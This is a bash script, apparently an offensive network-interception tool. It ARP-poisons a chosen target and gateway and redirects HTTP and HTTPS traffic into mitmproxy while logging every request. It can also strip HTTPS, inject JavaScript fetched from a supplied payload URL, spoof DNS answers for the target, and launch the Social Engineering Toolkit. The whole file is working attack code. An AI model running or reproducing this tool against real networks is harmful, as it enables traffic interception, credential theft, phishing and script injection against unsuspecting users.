#! /bin/bash

INTERACTIVE_MODE=0
HTTP_INTERCEPTION=0
HTTPS_INTERCEPTION=0
HTTPS_STRIPPING=0
INJECT_JS=0
DNSSPOOF=0
PAYLOAD_URL=""
INTERFACE=""

export PATH=$(pwd)/bin:${PATH}
#####################################
# Displays help
#####################################

function help(){
	echo "Usage: $0 [-g] [-n] [-s] [-x] [-j] <js payload url> [-d] [-i] <interface> gateway_ip target_ip"
	echo "       [-g] interactive mode for mitmproxy"
	echo "       [-n] capture HTTP traffic"
	echo "       [-s] capture HTTPS traffic"
	echo "       [-x] stripping https"
	echo "       [-j] inject js payload"
	echo "       [-d] dnsspoof + setoolkit"
	echo "       [-i] interface"
        exit 1
}

#####################################
# Checking is root
#####################################

if [ $(id -u) -ne 0 ]; then
    echo "You'd better be root! Exiting..."
    exit
fi

if [ $# -lt 2 ] || [ $# -gt 10 ]; then
    help
fi

#getting options -ins
while getopts ":gnsxj:di:" OPT; do
    case $OPT in
        g)
            INTERACTIVE_MODE=1
	    	echo "INTERACTIVE_MODE On"
            ;;
        n)
            HTTP_INTERCEPTION=1
	    	echo "HTTP_INTERCEPTION On"
            ;;
        s)
            HTTPS_INTERCEPTION=1
	    	echo "HTTPS_INTERCEPTION On"
            ;;
        x)
            HTTPS_STRIPPING=1
	    	echo "HTTPS_STRIPPING On"
            ;;
        j)
            INJECT_JS=1
            PAYLOAD_URL=${OPTARG}
            if [ "X"${PAYLOAD_URL} == "X" ];then
            	echo "payload url is missing!"
            	help
            fi
	    	echo "INJECT_JS On"
            ;;
        d)
            DNSSPOOF=1
	    	echo "DNSSPOOF On"
            ;;
        i)
            INTERFACE=${OPTARG}
            if [ "X"${INTERFACE} == "X" ]; then
				echo "interface is missing!"
				help
			fi
            ;;
        :)
            echo "Invalid option $OPT"
            help
            ;;
    esac
done

shift $(($OPTIND - 1))
GATEWAY=$1
TARGET=$2

#####################################
# Installing mitmproxy
#####################################

MITMPROXY_PATH=$(pwd)"/mitmproxy"

# Checking if mitmproxy has been installed
if [ ! -d "${MITMPROXY_PATH}" ];then

	echo -e "\nInstalling mitmproxy v1, please wait...\n"
	mkdir ${MITMPROXY_PATH} && \
	wget https://github.com/mitmproxy/mitmproxy/releases/download/v1.0/mitmproxy-1.0.0post1-linux.tar.gz -O ${MITMPROXY_PATH}/mitmproxy.tar && \
	tar -xvf ${MITMPROXY_PATH}/mitmproxy.tar -C ${MITMPROXY_PATH} && \
	rm -f ${MITMPROXY_PATH}/mitmproxy.tar
	echo -e "\nInstallation done.\n"
fi

#####################################
# Setting routing configuration
#####################################

# Check target ips are not null
if [ "X"${GATEWAY} == "X" ] || [ "X"${TARGET} == "X" ]; then
	echo "target ip is missing!"
	help
fi

if [ ${HTTP_INTERCEPTION} -eq 1 ] || [ ${HTTPS_INTERCEPTION} -eq 1 ]; then

	echo "Flushing iptables..."
	#####################################
	# flushing routing configuration
	#####################################
	iptables --flush
	iptables --table nat --flush
	iptables --delete-chain
	iptables --table nat --delete-chain

	
    #iptables redirect from 80 to 8080 on localhost
    if [ ${HTTP_INTERCEPTION} -eq 1 ]; then
		iptables -t nat -A PREROUTING -i ${INTERFACE} -p tcp --dport 80 -j REDIRECT --to-port 8080
	fi

 	#iptables redirect from 443 to 8080 on localhost
    if [ ${HTTPS_INTERCEPTION} -eq 1 ]; then
		iptables -t nat -A PREROUTING -i ${INTERFACE} -p tcp --dport 443 -j REDIRECT --to-port 8080
	fi
fi

#####################################
# DNS spoofing
#####################################

if [ ${DNSSPOOF} -eq 1 ]; then

	echo "Editing hosts file..."
	vi $(pwd)/conf/hosts

	echo "DNS spoofing..."
	xterm -T "DNS spoofing target ${TARGET}" -hold -e dnsspoof -i ${INTERFACE} -f $(pwd)/conf/hosts udp dst port 53 and src ${TARGET} &

	echo "Launching setoolkit..."
	xterm -T "Social Engineering Toolkit" -hold -e setoolkit &

	echo "Press a key when ready"

	read
fi

#####################################
# ARP poisoning
#####################################

arpoison ${GATEWAY} ${TARGET}

#####################################
# mitmproxy
#####################################

SSLSTRIP_SCRIPT=""
INJECTJS_SCRIPT=("" "")

if [ ${HTTPS_STRIPPING} -eq 1 ]; then
	SSLSTRIP_SCRIPT="--script $(pwd)/script/sslstrip.py"
fi

if [ ${INJECT_JS} -eq 1 ]; then
	INJECTJS_SCRIPT=("--script" "$(pwd)/script/injectjs.py ${PAYLOAD_URL}")
fi

if [ ${INTERACTIVE_MODE} -eq 1 ]; then
	xterm -maximized -T "mitmproxy" -hold -e ${MITMPROXY_PATH}/mitmproxy -T --anticache --host --anticomp --noapp --eventlog --script "$(pwd)/script/io_write_dumpfile.py $(pwd)/log/requests.log" ${SSLSTRIP_SCRIPT} ${INJECT_JS:+ ${INJECTJS_SCRIPT[0]} "${INJECTJS_SCRIPT[1]}"} &
else
	echo "Running mitmdump..."
	${MITMPROXY_PATH}/mitmdump -T --anticache --host --anticomp --noapp --quiet --script "$(pwd)/script/io_write_dumpfile.py $(pwd)/log/requests.log" ${SSLSTRIP_SCRIPT} ${INJECT_JS:+ ${INJECTJS_SCRIPT[0]} "${INJECTJS_SCRIPT[1]}"}
fi

